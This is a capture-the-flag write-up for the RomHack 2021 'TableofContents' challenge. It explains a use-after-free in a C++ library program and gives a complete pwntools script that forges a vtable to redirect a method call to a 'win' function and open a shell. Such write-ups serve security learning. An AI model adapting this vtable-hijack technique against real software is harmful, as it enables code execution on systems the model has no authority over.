# RomHack CTF 2021 TableofContents

## Introduction

The challenge disclosed the source code of some library application. Looking through the source you immediately notice how broken it is.
Specifically when you borrow a book you'll be left with a dangling Use after Free. The challenge is called `TableofContents` and written in C++, so... maybe vtables?

## Exploit

The idea was to overwrite the vtables of a `Book` in order to execute the `win` function instead of the `feedback` (Who needs feedback anyways).
It works like this:

1. Create some books
2. Borrow a book
3. Create a new page in some previously created book that contains crafted vtable entries re-pointing `feedback` to `win`
4. Return the book and borrow another one.
5. Create a new page in some previously created book that contains at least the vtable pointer to the previously crafted one.
6. Execute `win` by giving some feedback and spawn a shell.

Since addresses are static and we always get the address of stuff we previously borrowed we can always deduce the addresses that our pages will be created in. After we spawned a shell the flag could be disclosed from the current user's home directory. The full exploit looks as follows:

```python
#!/bin/env python3

from pwn import *

winAddress = 0x401E30
nullPtr = 0x0

def skipMenu(p):
    p.recv()

def addPage(p, content, index):
    p.sendline(b'3')
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(b'2')
    p.recv()
    p.sendline(str(len(content)))
    p.recv()
    p.sendline(content)
    p.recv()

def donateBook(p, title):
    p.sendline(b'1')
    p.recv()
    p.sendline(title)
    skipMenu(p)

def borrowBook(p, index) -> int:
    p.sendline(b'3')
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(b'1')
    p.recvuntil(":")
    addrLine = p.recvline()
    p.recv()
    return int(addrLine[3:-1], 16)

def returnBook(p, address):
    p.sendline(b'4')
    p.recv()
    p.sendline(hex(address))
    p.recv()

def valuableFeedback(p, funnyBook, command):
    p.sendline(b'5')
    p.recv()
    p.sendline(str(funnyBook))
    p.recv()
    p.sendline(command)
    p.interactive()


def makeVtPtr(address):
    return address.to_bytes(8, byteorder='little')

vtable = (makeVtPtr(nullPtr) * 5) + makeVtPtr(winAddress) + b'a' * 16
p = process("./tableofcontents")
# p = remote(HOST, PORT)
skipMenu(p)
donateBook(p, "book1")
donateBook(p, "book2")
donateBook(p, "book3")
add = borrowBook(p,0)
book = makeVtPtr(add) + b'a' * 56
secondBookAddress = add + 0x70
addPage(p, vtable, 2)
returnBook(p, secondBookAddress)
borrowBook(p, 1)
addPage(p, book, 2)
log.info("Spawning a Shell, have fun!")
valuableFeedback(p, 1, 'bash')
```
